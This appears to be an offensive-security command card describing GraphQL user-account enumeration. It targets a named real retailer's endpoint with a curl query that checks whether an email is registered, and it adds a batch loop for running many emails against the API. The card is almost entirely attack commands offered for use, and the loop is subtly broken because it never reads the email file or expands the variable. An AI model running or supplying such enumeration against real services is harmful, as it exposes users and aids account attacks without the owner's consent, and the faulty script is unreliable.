---
id: cmd-graphql-user-enum
data: >-
  curl -X POST https://www.on-running.com/en-in/graphql -H "Content-Type:
  application/json" -d '{"query": "query {
  userExists(email:\"test@example.com\") }"}'
tags:
  - graphql
  - enumeration
  - discovery
type: command
output: >-
  JSON response with data.userExists as boolean (true if user exists, false
  otherwise).
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.554Z'
verified: false
validated: true
submitted: true
---
# graphql-user-exists-enumeration

## Command

```bash
curl -X POST https://www.on-running.com/en-in/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { userExists(email:\"test@example.com\") }"}'
```

## Description

This command queries the GraphQL API for user existence by email, useful for enumeration after schema discovery via introspection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | JSON content type | Yes |
| `-d '{...}'` | Query with email parameter | Yes |
| `email` | Email address to check | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query": "query { userExists(email:\"user@domain.com\") }"}'
```

### Advanced Usage

Batch enumeration with scripting (e.g., loop over email list).

```bash
for email in emails.txt; do curl ... -d '{"query": "query { userExists(email:\"$email\") }"}'; done
```

## Expected Output

JSON like {"data":{"userExists":true}} if user exists, or false/null on error/non-existence.

## Related

- [[commands/graphql-introspection-query]]
- [[procedures/Exploit-GraphQL-Introspection-for-Schema-Leakage]]
